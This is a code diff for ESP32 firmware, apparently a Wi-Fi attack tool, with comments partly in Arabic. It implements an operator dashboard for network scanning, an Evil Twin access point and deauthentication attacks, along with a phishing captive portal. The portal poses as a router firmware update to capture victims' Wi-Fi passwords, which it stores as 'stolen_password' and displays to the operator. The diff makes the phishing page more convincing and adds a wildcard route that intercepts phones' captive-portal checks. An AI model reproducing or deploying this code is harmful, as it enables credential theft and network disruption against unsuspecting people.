@@ -15,13 +15,12 @@
 static const char *TAG = "WEBSERVER";
 static httpd_handle_t server = NULL;
 
-// متغير لحفظ كلمة المرور التي يتم سرقتها
 static char stolen_password[64] = "None";
-
-// متغير لمعرفة ما إذا كان الهجوم نشطاً
 static bool is_attack_active = false;
 
-// صفحة لوحة التحكم الخاصة بك (Dashboard)
+// ==========================================
+// 1. Dashboard HTML (لوحة التحكم الخاصة بك)
+// ==========================================
 const char *dashboard_html = 
 "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
 "<title>ESP32 Pentest Dashboard</title>"
@@ -34,13 +33,13 @@ const char *dashboard_html =
 
 "<div class='card'><h2>1. Scan Networks</h2>"
 "<button class='btn' onclick='fetch(\"/scan\").then(r=>r.text()).then(t=>document.getElementById(\"scan-res\").innerHTML=t)'>Start Scan</button>"
-"<div id='scan-res' style='color:#ffcc00; font-size:12px;'>Click Scan to find networks...</div></div>"
+"<div id='scan-res' style='color:#ffcc00; font-size:12px;'>Click Scan...</div></div>"
 
 "<div class='card'><h2>2. Evil Twin</h2>"
 "<form action='/start_eviltwin' method='get'>"
-"<input type='text' name='ssid' placeholder='Target SSID (Must match scan)' required>"
-"<input type='text' name='bssid' placeholder='Target BSSID (e.g., AA:BB:CC:DD:EE:FF)' required>"
-"<input type='number' name='channel' placeholder='Channel (1-13)' required>"
+"<input type='text' name='ssid' placeholder='Target SSID' required>"
+"<input type='text' name='bssid' placeholder='BSSID (AA:BB:CC:DD:EE:FF)' required>"
+"<input type='number' name='channel' placeholder='Channel' required>"
 "<input type='submit' class='btn btn-danger' value='Start Evil Twin'></form></div>"
 
 "<div class='card'><h2>3. Deauther</h2>"
@@ -51,33 +50,73 @@ const char *dashboard_html =
 "<div class='card'><h2>4. Stolen Credentials</h2>"
 "<p style='color:#ffcc00;'>Password: <b>{PASSWORD}</b></p></div>"
 
-"<div class='card'><h2>5. Stop All Attacks</h2>"
-"<button class='btn btn-success' onclick='fetch(\"/stop\")'>Stop & Return to Safe Mode</button></div>"
+"<div class='card'><h2>5. Stop All</h2>"
+"<button class='btn btn-success' onclick='fetch(\"/stop\")'>Stop & Safe Mode</button></div>"
 "</body></html>";
 
-// صفحة التصيد (Portal) التي ستظهر للضحايا
+// ==========================================
+// 2. Portal HTML (صفحة التصيد المقنعة)
+// ==========================================
 const char *portal_html = 
 "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
-"<title>Router Update Required</title>"
-"<style>body{font-family:sans-serif;background:#f0f0f0;color:#333;text-align:center;padding:50px;}"
-"h1{color:#d9534f;} .card{background:#fff;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:400px;margin:auto;}"
-"input{padding:12px;border-radius:5px;border:1px solid #ccc;margin:10px;width:80%;}"
-".btn{background:#0275d8;color:white;padding:12px 20px;border:none;cursor:pointer;border-radius:5px;width:88%;}"
+"<title>System Update Required</title>"
+"<style>"
+"* { box-sizing: border-box; }"
+"body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f6f8; color: #333; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }"
+".container { background-color: #ffffff; width: 100%; max-width: 450px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; margin: 20px; }"
+".header { background-color: #1a56db; color: white; padding: 25px 20px; text-align: center; }"
+".header svg { width: 50px; height: 50px; margin-bottom: 10px; fill: currentColor; }"
+".header h1 { margin: 0; font-size: 22px; font-weight: 600; }"
+".content { padding: 30px 25px; text-align: center; }"
+".content p { font-size: 15px; line-height: 1.6; color: #555; margin-bottom: 25px; }"
+".form-group { margin-bottom: 20px; text-align: left; }"
+".form-group label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 8px; }"
+".form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; outline: none; transition: border-color 0.3s; }"
+".form-group input:focus { border-color: #1a56db; }"
+".btn { background-color: #1a56db; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s; }"
+".btn:hover { background-color: #1546b3; }"
+".footer { padding: 15px; text-align: center; font-size: 11px; color: #999; border-top: 1px solid #eee; background: #fafafa; }"
+".progress-bar { width: 100%; height: 6px; background-color: #e2e8f0; border-radius: 3px; margin-bottom: 20px; overflow: hidden; }"
+".progress { width: 0%; height: 100%; background-color: #1a56db; transition: width 0.5s; }"
 "</style></head>"
-"<body><div class='card'>"
-"<h1>&#9888; Router Security Update</h1>"
-"<p>Your router requires a firmware update to fix a critical vulnerability. Please enter your Wi-Fi password to continue.</p>"
-"<form action='/submit_password' method='get'>"
-"<input type='password' name='password' placeholder='Enter Wi-Fi Password' required>"
-"<input type='submit' class='btn' value='Update Router'>"
-"</form></div></body></html>";
+"<body>"
+"<div class='container'>"
+"  <div class='header'>"
+"    <svg viewBox='0 0 24 24'><path d='M12 2L2 22h20L12 2zm0 3.8L18.5 20h-13L12 5.8zM11 10v5h2v-5h-2zm0 6v2h2v-2h-2z'/></svg>"
+"    <h1>Firmware Update Required</h1>"
+"  </div>"
+"  <div class='content'>"
+"    <div class='progress-bar'><div class='progress' id='progress'></div></div>"
+"    <p>A critical security vulnerability has been detected in your router's current firmware. Please confirm your Wi-Fi password to authorize the update and restore your internet connection.</p>"
+"    <form action='/submit_password' method='get'>"
+"      <div class='form-group'>"
+"        <label>Network Name (SSID)</label>"
+"        <input type='text' value='Auto-Detected' disabled style='background:#f0f0f0; color:#777;'>"
+"      </div>"
+"      <div class='form-group'>"
+"        <label>Wi-Fi Password</label>"
+"        <input type='password' name='password' placeholder='Enter your password' required>"
+"      </div>"
+"      <button type='submit' class='btn'>Authorize Update</button>"
+"    </form>"
+"  </div>"
+"  <div class='footer'>Secure Connection &bull; Router Management System v2.4</div>"
+"</div>"
+"<script>"
+"  let progress = 0;"
+"  let interval = setInterval(function() {"
+"    if (progress >= 100) clearInterval(interval);"
+"    else { progress += Math.floor(Math.random() * 10) + 1; if(progress > 100) progress = 100; document.getElementById('progress').style.width = progress + '%'; }"
+"  }, 500);"
+"</script>"
+"</body></html>";
 
-// دالة عرض لوحة التحكم (مع استبدال كلمة المرور)
+// ==========================================
+// 3. المعالجات (Handlers)
+// ==========================================
 static esp_err_t index_handler(httpd_req_t *req) {
     char *response = malloc(4096);
     strcpy(response, dashboard_html);
-    
-    // استبدال {PASSWORD} بكلمة المرور المسروقة
     char *pos = strstr(response, "{PASSWORD}");
     if (pos) {
         char temp[4096];
@@ -87,21 +126,18 @@ static esp_err_t index_handler(httpd_req_t *req) {
         strcat(temp, pos + strlen("{PASSWORD}"));
         strcpy(response, temp);
     }
-    
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, response, strlen(response));
     free(response);
     return ESP_OK;
 }
 
-// دالة عرض صفحة التصيد (Portal)
 static esp_err_t portal_handler(httpd_req_t *req) {
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, portal_html, strlen(portal_html));
     return ESP_OK;
 }
 
-// دالة استلام كلمة المرور من الضحية
 static esp_err_t submit_password_handler(httpd_req_t *req) {
     char buf[100], password[64] = {0};
     if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
@@ -109,34 +145,51 @@ static esp_err_t submit_password_handler(httpd_req_t *req) {
         strncpy(stolen_password, password, sizeof(stolen_password) - 1);
         ESP_LOGI(TAG, "Stolen Password: %s", stolen_password);
     }
-    httpd_resp_send(req, "<h1>Thank you! Your router has been updated.</h1>", HTTPD_RESP_USE_STRLEN);
+    httpd_resp_send(req, "<h1>Thank you! Router Updated.</h1>", HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
 
-// دالة المسح
+// دالة توجيه الجذر (تفرق بين لوحة التحكم وصفحة التصيد)
+static esp_err_t root_handler(httpd_req_t *req) {
+    // إذا كان المسار غير المسارات المعروفة (طلبات الأندرويد والآيفون) وكان الهجوم نشطاً
+    if (strcmp(req->uri, "/") != 0 && strcmp(req->uri, "/scan") != 0 && 
+        strcmp(req->uri, "/start_eviltwin") != 0 && strcmp(req->uri, "/start_deauth") != 0 && 
+        strcmp(req->uri, "/stop") != 0 && strcmp(req->uri, "/submit_password") != 0 && 
+        strcmp(req->uri, "/portal") != 0) {
+        
+        if (is_attack_active) {
+            httpd_resp_set_status(req, "302 Found");
+            httpd_resp_set_hdr(req, "Location", "/portal");
+            httpd_resp_send(req, NULL, 0);
+            return ESP_OK;
+        }
+    }
+
+    if (strcmp(req->uri, "/") == 0) {
+        return index_handler(req);
+    }
+    
+    // أي مسار آخر، اعرض صفحة التصيد
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_send(req, portal_html, strlen(portal_html));
+    return ESP_OK;
+}
+
 static esp_err_t scan_handler(httpd_req_t *req) {
     wifi_scan_config_t scan_config = { .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = false };
     esp_wifi_scan_start(&scan_config, true);
-
     uint16_t ap_count = 0;
     esp_wifi_scan_get_ap_num(&ap_count);
-    if (ap_count == 0) {
-        httpd_resp_send(req, "No networks found.", HTTPD_RESP_USE_STRLEN);
-        return ESP_OK;
-    }
-    
+    if (ap_count == 0) { httpd_resp_send(req, "No networks found.", HTTPD_RESP_USE_STRLEN); return ESP_OK; }
     wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
     esp_wifi_scan_get_ap_records(&ap_count, ap_records);
-
     char *response = malloc(4096);
-    strcpy(response, "<b>Found Networks:</b><br>");
+    strcpy(response, "<b>Found:</b><br>");
     for (int i = 0; i < ap_count && i < 10; i++) {
         char line[150];
         sprintf(line, "SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d<br>",
-                (char*)ap_records[i].ssid,
-                ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
-                ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5],
-                ap_records[i].primary);
+                (char*)ap_records[i].ssid, ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
+                ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5], ap_records[i].primary);
         strcat(response, line);
     }
     free(ap_records);
@@ -145,25 +198,19 @@ static esp_err_t scan_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
-// دالة بدء Evil Twin
 static esp_err_t start_eviltwin_handler(httpd_req_t *req) {
     char buf[200], ssid[32] = {0}, bssid_str[18] = {0}, channel_str[4] = {0};
     if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
         httpd_query_key_value(buf, "ssid", ssid, sizeof(ssid));
         httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
         httpd_query_key_value(buf, "channel", channel_str, sizeof(channel_str));
-        
         target_info_t target;
         memset(&target, 0, sizeof(target));
         strncpy(target.ssid, ssid, sizeof(target.ssid) - 1);
         target.channel = atoi(channel_str);
-        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
-               &target.bssid[0], &target.bssid[1], &target.bssid[2],
-               &target.bssid[3], &target.bssid[4], &target.bssid[5]);
-               
+        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target.bssid[0], &target.bssid[1], &target.bssid[2], &target.bssid[3], &target.bssid[4], &target.bssid[5]);
         evil_twin_start_attack(&target);
         is_attack_active = true; // تفعيل وضع الهجوم
-        
         httpd_resp_send(req, "<h1 style='color:red;'>Evil Twin Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
         return ESP_OK;
     }
@@ -171,16 +218,13 @@ static esp_err_t start_eviltwin_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
-// دالة بدء Deauth
 static esp_err_t start_deauth_handler(httpd_req_t *req) {
     char buf[100], bssid_str[18] = {0};
     if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
         httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
         target_info_t target;
         memset(&target, 0, sizeof(target));
-        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
-               &target.bssid[0], &target.bssid[1], &target.bssid[2],
-               &target.bssid[3], &target.bssid[4], &target.bssid[5]);
+        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target.bssid[0], &target.bssid[1], &target.bssid[2], &target.bssid[3], &target.bssid[4], &target.bssid[5]);
         deauther_send_frames(&target, DEAUTHER_ATTACK_DEAUTH_FRAME);
         httpd_resp_send(req, "<h1 style='color:red;'>Deauth Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
         return ESP_OK;
@@ -189,7 +233,6 @@ static esp_err_t start_deauth_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
-// دالة الإيقاف
 static esp_err_t stop_handler(httpd_req_t *req) {
     evil_twin_stop_attack();
     deauther_stop();
@@ -198,20 +241,9 @@ static esp_err_t stop_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
-// دالة توجيه الجذر (تقرر ما إذا كانت تعرض لوحة التحكم أم صفحة التصيد)
-static esp_err_t root_handler(httpd_req_t *req) {
-    if (is_attack_active) {
-        // إذا كان الهجوم نشطاً، وجه الضحية إلى صفحة التصيد
-        httpd_resp_set_status(req, "302 Found");
-        httpd_resp_set_hdr(req, "Location", "/portal");
-        httpd_resp_send(req, NULL, 0);
-        return ESP_OK;
-    } else {
-        // إذا لم يكن هناك هجوم، اعرض لوحة التحكم الخاصة بك
-        return index_handler(req);
-    }
-}
-
+// ==========================================
+// 4. بدء الخادم
+// ==========================================
 void http_server_start(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = 80;
@@ -224,11 +256,12 @@ void http_server_start(void) {
         {.uri = "/scan", .method = HTTP_GET, .handler = scan_handler},
         {.uri = "/start_eviltwin", .method = HTTP_GET, .handler = start_eviltwin_handler},
         {.uri = "/start_deauth", .method = HTTP_GET, .handler = start_deauth_handler},
-        {.uri = "/stop", .method = HTTP_GET, .handler = stop_handler}
+        {.uri = "/stop", .method = HTTP_GET, .handler = stop_handler},
+        {.uri = "/*", .method = HTTP_GET, .handler = root_handler} // لاعتراض طلبات الأندرويد والآيفون
     };
 
     if (httpd_start(&server, &config) == ESP_OK) {
-        for (int i = 0; i < 7; i++) {
+        for (int i = 0; i < 8; i++) {
             httpd_register_uri_handler(server, &uris[i]);
         }
         ESP_LOGI(TAG, "Full Evil Twin & Portal server started");
